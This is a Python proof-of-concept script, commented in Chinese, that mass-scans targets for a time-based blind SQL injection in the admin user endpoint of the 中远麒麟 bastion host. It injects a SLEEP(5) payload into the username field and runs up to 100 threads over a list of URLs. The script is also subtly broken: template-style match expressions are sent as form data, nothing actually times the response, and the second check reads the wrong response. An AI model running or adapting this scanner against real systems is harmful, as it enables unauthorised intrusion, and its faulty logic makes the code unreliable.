# 中远麒麟堡垒机存在SQL注入漏洞的检测脚本
import argparse, requests, sys  # 导入必要的库
from multiprocessing.dummy import Pool  # 导入线程池模块，用于并发处理

# 禁用HTTPS请求的警告信息
requests.packages.urllib3.disable_warnings()


def banner():
    # 显示横幅信息，包含作者、日期和版本
    banner = '''  
███████╗██╗   ██╗ ██████╗ ██╗             ███████╗ ██████╗ ██╗     ██╗  
╚══███╔╝╚██╗ ██╔╝██╔═══██╗██║             ██╔════╝██╔═══██╗██║     ██║  
  ███╔╝  ╚████╔╝ ██║   ██║██║             ███████╗██║   ██║██║     ██║  
 ███╔╝    ╚██╔╝  ██║▄▄ ██║██║             ╚════██║██║▄▄ ██║██║     ██║  
███████╗   ██║   ╚██████╔╝███████╗███████╗███████║╚██████╔╝███████╗██║  
╚══════╝   ╚═╝    ╚══▀▀═╝ ╚══════╝╚══════╝╚══════╝ ╚══▀▀═╝ ╚══════╝╚═╝  
                                   author:MOYV  
                                   date:2024/09/03  
                                   version:1.0   
'''
    print(banner)  # 打印横幅


def poc(target):
    # 漏洞检测函数，接受目标URL
    url = target + "/admin.php?controller=admin_commonuser"  # 目标请求的URL
    # 定义请求头
    headers = {
        "Cookie": "PHPSESSID=4638581ea38250ea39ad8b15951634ed",  # 会话Cookie
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",  # 浏览器信息
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",  # 接受的语言
        "Accept-Encoding": "gzip, deflate",  # 支持的编码类型
        "Referer": "https://fofa.info/",  # 来源地址
        "Upgrade-Insecure-Requests": "1",  # 请求头，表示支持升级不安全请求
        "Sec-Fetch-Dest": "document",  # 安全抓取目标
        "Sec-Fetch-Mode": "navigate",  # 安全抓取模式
        "Sec-Fetch-Site": "cross-site",  # 安全抓取站点
        "Sec-Fetch-User": "?1",  # 安全抓取用户
        "Te": "trailers",  # 传输编码类型
        "Connection": "close",  # 连接类型
        "Content-Type": "application/x-www-form-urlencoded",  # 内容类型
        "Content-Length": "77"  # 内容长度
    }

    # 构造SQL注入payload
    data = {
        "username": "admin' AND (SELECT 6999 FROM (SELECT(SLEEP(5)))ptGN) AND 'AAdm'='AAdm",  # 带有延时的SQL注入
        "follow_redirects": "true",
        "matches": "(code.eq(\"200\") && time.gt(\"5\") && time.lt(\"10\"))"  # 匹配成功的条件
    }

    data1 = {
        "username": "admin' AND (SELECT 6999 FROM (SELECT(SLEEP(5)))ptGN) AND 'AAdm'='AAdm",  # 第二个payload
        "follow_redirects": "true",
        "matches": "(code.eq(\"200\") && time.lt(\"5\")"  # 匹配成功的条件
    }

    try:
        # 发送第一个请求以检测SQL注入
        res = requests.get(url=url, headers=headers, data=data, verify=False, timeout=10)
        # 检查响应状态和特定文本以判断是否存在注入漏洞
        if res.status_code == 200 and "result" in res.text and "username and password does not match" in res.text:
            # 如果第一个请求成功，则发送第二个请求
            res1 = requests.get(url=url, headers=headers, data=data1, verify=False, timeout=10)
            # 检查第二个请求的响应以确认注入漏洞
            if res1.status_code == 200 and "result" in res.text and "username and password does not match" in res1.text:
                print(f"[+]{target}存在SQL注入")  # 输出检测到SQL注入的结果
                # 将结果写入文件
                with open('result.txt', 'a', encoding='utf-8') as f:
                    f.write(f"{target}存在SQL注入\n")
        else:
            print(f"[-]{target}不存在SQL注入")  # 输出未检测到SQL注入的结果
    except:
        print(f"[!]{target}可能存在问题，请手动检测")  # 捕获异常并提示可能的问题


def main():
    banner()  # 打印程序横幅信息
    # 设置命令行参数解析
    parse = argparse.ArgumentParser(description="这是中原麒麟堡垒机sql注入的poc")
    parse.add_argument("-u", "--url", dest="url", type=str, help="Please enter url")  # URL参数
    parse.add_argument("-f", "--file", dest="file", type=str, help="Please enter file")  # URL文件参数
    args = parse.parse_args()  # 解析参数

    # 根据输入参数执行相应操作
    if args.url and not args.file:  # 如果只提供了URL
        poc(args.url)  # 调用poc函数进行检测
    elif not args.url and args.file:  # 如果只提供了文件
        url_list = []  # 创建URL列表
        # 从文件中读取URL
        with open(args.file, "r", encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n", ""))  # 去除换行符并添加到列表
        mp = Pool(100)  # 创建线程池，最多100个线程
        mp.map(poc, url_list)  # 使用异步处理方式检测每个URL
        mp.close()  # 关闭线程池
        mp.join()  # 等待所有线程完成
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")  # 输出使用说明


if __name__ == '__main__':
    main()  # 执行主函数